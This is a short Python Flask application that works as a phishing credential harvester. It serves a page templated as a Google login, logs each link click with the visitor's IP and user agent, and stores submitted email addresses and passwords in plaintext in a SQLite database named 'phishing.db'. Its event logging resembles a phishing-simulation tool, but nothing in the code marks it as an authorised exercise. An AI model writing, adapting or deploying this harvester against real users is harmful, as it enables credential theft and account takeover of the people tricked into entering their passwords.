from flask import Flask, request, render_template

import sqlite3

from datetime import datetime

app = Flask(__name__)

DB_NAME = "phishing.db"

def init_db():

	conn = sqlite3.connect(DB_NAME)
	c = conn.cursor()
	c.execute("""

		CREATE TABLE IF NOT EXISTS events(
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		event_type TEXT,
		username TEXT,
		password TEXT,
		ip TEXT,
		user_agent TEXT,
 		timestamp TEXT

		)

	""")
	conn.commit()
	conn.close()



def log_event(event_type, username=None, password=None):
	conn = sqlite3.connect(DB_NAME)

	c = conn.cursor()

	ip = request.remote_addr

	ua = request.headers.get("User-Agent", "")

	ts = datetime.utcnow().isoformat()

	c.execute("""

		INSERT INTO events (event_type, username, password, ip, user_agent, timestamp)
		VALUES (?, ?, ?, ?, ?, ?)

	""", (event_type, username, password, ip, ua, ts))

	conn.commit()
	conn.close()

@app.route("/")

def landing(): 

	log_event("link_click")
	return render_template("google_login.html")

@app.route("/login", methods=["POST"])
def login():

	username = request.form.get("email")
	password = request.form.get("password")
	log_event("credential_submission", username, password)
	return render_template("thanks.html")

if __name__ == "__main__":

	init_db()
	app.run(host="0.0.0.0", port=5000)

